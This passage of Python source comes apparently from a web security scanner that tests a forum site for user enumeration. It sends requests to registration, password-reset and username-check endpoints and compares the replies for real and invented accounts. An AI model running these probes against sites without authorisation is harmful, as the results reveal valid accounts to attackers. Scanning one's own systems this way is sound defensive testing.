                    self.results['user_enumeration'].append({
                        'method': 'Login response difference',
                        'endpoint': '/session',
                        'severity': 'Medium',
                        'description': 'Different responses for existing vs non-existing users'
                    })
    
    def _test_registration_user_enumeration(self):
        """Test user enumeration via registration"""
        register_url = urljoin(self.scanner.target_url, '/u/create')
        csrf_token = extract_csrf_token(self.scanner.session, self.scanner.target_url)
        
        if csrf_token:
            # Test with existing username
            existing_data = {
                'username': 'admin',
                'email': 'test@example.com',
                'password': 'testpassword',
                'authenticity_token': csrf_token
            }
            
            response1 = make_request(self.scanner.session, 'POST', register_url, data=existing_data)
            
            # Test with new username
            new_data = {
                'username': f'newuser{int(time.time())}',
                'email': f'test{int(time.time())}@example.com',
                'password': 'testpassword',
                'authenticity_token': csrf_token
            }
            
            response2 = make_request(self.scanner.session, 'POST', register_url, data=new_data)
            
            if response1 and response2:
                if ('taken' in response1.text.lower() or 
                    'exists' in response1.text.lower()):
                    self.results['user_enumeration'].append({
                        'method': 'Registration username check',
                        'endpoint': '/u/create',
                        'severity': 'Low',
                        'description': 'Registration reveals existing usernames'
                    })
    
    def _test_password_reset_enumeration(self):
        """Test user enumeration via password reset"""
        reset_url = urljoin(self.scanner.target_url, '/password-reset')
        csrf_token = extract_csrf_token(self.scanner.session, self.scanner.target_url)
        
        if csrf_token:
            # Test with existing email
            existing_data = {
                'login': 'admin@example.com',
                'authenticity_token': csrf_token
            }
            
            response1 = make_request(self.scanner.session, 'POST', reset_url, data=existing_data)
            
            # Test with non-existing email
            nonexisting_data = {
                'login': 'nonexistent@example.com',
                'authenticity_token': csrf_token
            }
            
            response2 = make_request(self.scanner.session, 'POST', reset_url, data=nonexisting_data)
            
            if response1 and response2:
                if response1.text != response2.text:
                    self.results['user_enumeration'].append({
                        'method': 'Password reset response',
                        'endpoint': '/password-reset',
                        'severity': 'Medium',
                        'description': 'Password reset reveals existing email addresses'
                    })
    
    def _test_api_user_enumeration(self):
        """Test user enumeration via API endpoints"""
        api_endpoints = [
            '/users/check_username',
            '/users/check_email',
            '/u/check_username.json',
            '/u/check_email.json'
        ]
        
        for endpoint in api_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            # Test with existing username
            params1 = {'username': 'admin'}
            response1 = make_request(self.scanner.session, 'GET', url, params=params1)
            
            # Test with non-existing username
            params2 = {'username': 'nonexistentuser12345'}
            response2 = make_request(self.scanner.session, 'GET', url, params=params2)
            
            if response1 and response2:
                if response1.text != response2.text:
                    self.results['user_enumeration'].append({
                        'method': 'API username check',
                        'endpoint': endpoint,
                        'severity': 'Medium',
                        'description': f'API endpoint {endpoint} reveals existing usernames'
                    })